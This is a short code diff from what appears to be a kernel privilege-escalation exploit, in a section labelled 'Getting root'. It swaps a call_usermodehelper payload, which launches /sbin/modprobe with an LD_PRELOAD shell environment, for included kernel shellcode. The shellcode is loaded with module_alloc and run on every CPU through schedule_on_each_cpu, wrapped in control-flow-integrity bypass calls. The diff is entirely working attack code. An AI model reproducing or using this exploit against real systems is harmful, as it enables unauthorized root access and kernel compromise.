@@ -162,12 +162,17 @@ struct kernel_info kernels[] = {
 
 // * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * *
 
-int (*call_usermodehelper)(const char *, void *, void *, int) = (void *)X_call_usermodehelper;
+void *(*module_alloc)(long) = (void *)X_module_alloc;
+long (*schedule_on_each_cpu)(long) = (void *)X_schedule_on_each_cpu;
 
-static inline void get_root_real(void) {
-	char *argv[] = { (char []){ "/sbin/modprobe" }, NULL };
-	char *envp[] = { (char []){ LD_PRELOAD_SHELL }, NULL };
-	call_usermodehelper(argv[0], argv, envp, 1);
+static char shellcode[] = {
+# include "shellcode.inc"
+};
+
+static void __attribute__((always_inline)) inline get_root_real(void) {
+	void *p = module_alloc(sizeof(shellcode));
+	__builtin_memcpy(p, shellcode, sizeof(shellcode));
+	schedule_on_each_cpu((long)p);
 }
 
 struct stack_frame {
@@ -198,12 +203,7 @@ void get_root()
 {
 	struct stack_frame frames[ 8 ];
 	cfi_bypass_enter(frames, sizeof(frames) / sizeof(frames[0]));
-//	get_root_real();
-{
-	char *argv[] = { (char []){ "/sbin/modprobe" }, NULL };
-	char *envp[] = { (char []){ LD_PRELOAD_SHELL }, NULL };
-	call_usermodehelper(argv[0], argv, envp, 1);
-}
+	get_root_real();
 	cfi_bypass_leave(frames, sizeof(frames) / sizeof(frames[0]));
 }
 
